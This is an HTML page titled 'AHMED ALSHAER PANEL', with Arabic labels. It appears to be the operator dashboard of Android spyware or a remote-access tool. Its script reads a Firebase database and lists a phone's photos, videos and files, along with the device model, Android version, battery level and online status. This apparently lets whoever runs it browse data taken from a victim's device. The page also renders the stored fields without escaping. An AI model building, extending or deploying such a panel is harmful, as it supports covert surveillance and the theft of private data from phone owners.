<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>📱 AHMED ALSHAER PANEL</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:sans-serif;background:#0a0a0a;color:#fff;min-height:100vh;padding:15px}
        h1{color:#25D366;text-align:center;margin:20px 0;font-size:24px}
        .tabs{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin:15px 0}
        .tab{padding:12px 18px;background:#1a1a1a;border:2px solid #333;border-radius:10px;cursor:pointer;font-size:14px;font-weight:bold;transition:0.2s;color:#fff}
        .tab:hover{background:#222}.tab.active{background:#25D366;color:#000;border-color:#25D366}
        .content{max-width:800px;margin:0 auto}
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px}
        .item{background:#111;border:1px solid #222;border-radius:10px;padding:10px;text-align:center;transition:0.2s}
        .item:hover{border-color:#25D366}
        .item .icon{font-size:45px;margin:10px 0}
        .item .name{font-size:11px;word-break:break-all;color:#ccc}
        .item .size{font-size:10px;color:#25D366}
        .info-box{background:#111;border:2px solid #25D366;border-radius:15px;padding:25px;text-align:center}
        .info-box p{margin:10px 0;font-size:16px}
        .info-box b{color:#25D366}
        .loading{text-align:center;color:#888;padding:40px}
        .empty{text-align:center;color:#888;padding:30px}
    </style>
</head>
<body>
    <h1>📱 AHMED ALSHAER PANEL</h1>
    
    <div class="tabs">
        <div class="tab active" onclick="showTab('photos',this)">📸 الصور</div>
        <div class="tab" onclick="showTab('videos',this)">🎥 الفيديوهات</div>
        <div class="tab" onclick="showTab('files',this)">📁 الملفات</div>
        <div class="tab" onclick="showTab('info',this)">📊 الجهاز</div>
    </div>
    
    <div class="content" id="content"><div class="loading">⏳ جاري التحميل...</div></div>

    <script>
        let allData = {photos: [], videos: [], files: [], device: null};
        
        // تحميل من Firebase
        fetch('https://otp-5acda-default-rtdb.firebaseio.com/panel.json')
            .then(r => r.json())
            .then(data => {
                if (!data) return document.getElementById('content').innerHTML = '<div class="empty">لا توجد بيانات</div>';
                
                Object.values(data).forEach(entry => {
                    if (entry.type === 'photos') allData.photos = entry.data;
                    if (entry.type === 'videos') allData.videos = entry.data;
                    if (entry.type === 'files') allData.files = entry.data;
                    if (entry.type === 'device') allData.device = entry.data;
                });
                
                showTab('photos', document.querySelector('.tab'));
            });
        
        function showTab(tab, el) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            el.classList.add('active');
            const c = document.getElementById('content');
            
            if (tab === 'photos') {
                c.innerHTML = allData.photos.length ? 
                    '<div class="grid">' + allData.photos.map(p => `
                        <div class="item"><div class="icon">📸</div><div class="name">${p.name}</div><div class="size">${p.size}</div></div>
                    `).join('') + '</div>' : '<div class="empty">لا توجد صور</div>';
            }
            else if (tab === 'videos') {
                c.innerHTML = allData.videos.length ? 
                    '<div class="grid">' + allData.videos.map(v => `
                        <div class="item"><div class="icon">🎥</div><div class="name">${v.name}</div><div class="size">${v.size}</div></div>
                    `).join('') + '</div>' : '<div class="empty">لا توجد فيديوهات</div>';
            }
            else if (tab === 'files') {
                c.innerHTML = allData.files.length ? 
                    '<ul style="list-style:none">' + allData.files.map(f => `<li style="padding:10px;background:#111;margin:5px 0;border-radius:8px">📄 ${f.name}</li>`).join('') + '</ul>' : '<div class="empty">لا توجد ملفات</div>';
            }
            else if (tab === 'info') {
                c.innerHTML = allData.device ? 
                    '<div class="info-box">' +
                    '<p>📱 <b>' + allData.device.device + '</b></p>' +
                    '<p>🤖 Android ' + allData.device.android + '</p>' +
                    '<p>🔋 ' + allData.device.battery + '</p>' +
                    '<p>🟢 Online</p>' +
                    '</div>' : '<div class="empty">لا توجد معلومات</div>';
            }
        }
    </script>
</body>
</html>
